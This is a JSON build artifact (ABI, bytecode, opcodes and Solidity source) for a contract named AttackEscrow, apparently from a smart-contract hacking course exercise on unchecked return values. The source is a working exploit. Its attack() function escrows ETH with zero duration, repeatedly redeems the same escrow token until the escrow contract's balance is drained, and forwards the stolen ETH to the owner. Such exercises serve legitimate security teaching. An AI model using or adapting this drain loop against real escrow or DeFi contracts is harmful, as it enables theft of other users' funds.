{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_nft",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_escrow",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "60c060405234801561001057600080fd5b5060405161064138038061064183398101604081905261002f916100bb565b6100383361004f565b6001600160a01b0391821660a052166080526100ee565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b03811681146100b657600080fd5b919050565b600080604083850312156100ce57600080fd5b6100d78361009f565b91506100e56020840161009f565b90509250929050565b60805160a05161051a610127600039600061015c01526000818160f2015281816101ea01528181610229015261028f015261051a6000f3fe6080604052600436106100435760003560e01c8063715018a61461004f5780638da5cb5b146100665780639e5faafc14610092578063f2fde38b1461009a57600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b506100646100ba565b005b34801561007257600080fd5b50600054604080516001600160a01b039092168252519081900360200190f35b6100646100ce565b3480156100a657600080fd5b506100646100b536600461049b565b610378565b6100c26103f1565b6100cc600061044b565b565b6100d66103f1565b60405163610cd7f760e11b8152306004820152600060248201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063c219afee9034906044016000604051808303818588803b15801561013f57600080fd5b505af1158015610153573d6000803e3d6000fd5b505050505060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d082e3816040518163ffffffff1660e01b81526004016020604051808303816000875af11580156101ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101de91906104cb565b90506001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016315b3481106102bf5760405163104a4fc960e21b8152600481018390527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906341293f2490602401600060405180830381600087803b15801561027557600080fd5b505af1158015610289573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631905061020c565b600080546040516001600160a01b039091169047908381818185875af1925050503d806000811461030c576040519150601f19603f3d011682016040523d82523d6000602084013e610311565b606091505b50509050806103735760405162461bcd60e51b815260206004820152602360248201527f61747461636b206661696c65642c2065746820636f756c646e27742062652073604482015262195b9d60ea1b60648201526084015b60405180910390fd5b505050565b6103806103f1565b6001600160a01b0381166103e55760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161036a565b6103ee8161044b565b50565b6000546001600160a01b031633146100cc5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640161036a565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156104ad57600080fd5b81356001600160a01b03811681146104c457600080fd5b9392505050565b6000602082840312156104dd57600080fd5b505191905056fea26469706673582212208252a579e57f3d0fe659215785980412faad3913a8cac69397680addb405868364736f6c63430008130033",
  "bytecodeSha1": "644e96f4f5679819a6fbea953ecbf153276b1d18",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AttackEscrow",
  "language": "Solidity",
  "natspec": {
    "author": "JohnnyTime (https://smartcontractshacking.com)",
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "title": "AttackEscrow",
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0xBA JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x64 PUSH2 0xCE JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0xB5 CALLDATASIZE PUSH1 0x4 PUSH2 0x49B JUMP JUMPDEST PUSH2 0x378 JUMP JUMPDEST PUSH2 0xC2 PUSH2 0x3F1 JUMP JUMPDEST PUSH2 0xCC PUSH1 0x0 PUSH2 0x44B JUMP JUMPDEST JUMP JUMPDEST PUSH2 0xD6 PUSH2 0x3F1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x610CD7F7 PUSH1 0xE1 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0xC219AFEE SWAP1 CALLVALUE SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD082E381 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1DE SWAP2 SWAP1 PUSH2 0x4CB JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND BALANCE JUMPDEST CALLVALUE DUP2 LT PUSH2 0x2BF JUMPI PUSH1 0x40 MLOAD PUSH4 0x104A4FC9 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x41293F24 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x289 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE SWAP1 POP PUSH2 0x20C JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 SELFBALANCE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x30C JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x311 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x373 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x61747461636B206661696C65642C2065746820636F756C646E27742062652073 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x195B9D PUSH1 0xEA SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x380 PUSH2 0x3F1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x3E5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x646472657373 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x36A JUMP JUMPDEST PUSH2 0x3EE DUP2 PUSH2 0x44B JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x36A JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR DUP5 SSTORE PUSH1 0x40 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 DUP4 SWAP2 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP2 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP3 MSTORE 0xA5 PUSH26 0xE57F3D0FE659215785980412FAAD3913A8CAC69397680ADDB405 DUP7 DUP4 PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "sha1": "ff55850394102c98b9ece37b9820d66029435263",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\ninterface IEscrowNFT is IERC721 {\n    function tokenDetails(uint256) external view returns (uint256, uint256);\n    function tokenCounter() external returns(uint256);\n}\n\ninterface IEscrow {\n    function escrowEth(address _recipient, uint256 _duration) external payable;\n    function redeemEthFromEscrow(uint256 _tokenId) external;\n}\n\n/**\n * @title AttackEscrow\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract AttackEscrow is Ownable {\n\n    IEscrow private immutable escrow;\n    IEscrowNFT private immutable nft;\n\n    constructor(address _nft, address _escrow) {    \n        nft = IEscrowNFT(_nft);\n        escrow = IEscrow(_escrow);\n    }\n\n    function attack() external payable onlyOwner {\n        escrow.escrowEth{value: msg.value}(address(this), 0);\n\n        uint256 tokenId = nft.tokenCounter();\n        uint256 escrowETHBalance = address(escrow).balance;\n\n        while(escrowETHBalance >= msg.value) {\n            escrow.redeemEthFromEscrow(tokenId);\n            escrowETHBalance = address(escrow).balance;\n        }\n\n        (bool success, ) = owner().call{value: address(this).balance}(\"\");\n        require(success, \"attack failed, eth couldn't be sent\");\n    }\n\n    receive() external payable {}\n}",
  "sourcePath": "contracts/unchecked-returns-2/AttackEscrow.sol",
  "type": "contract"
}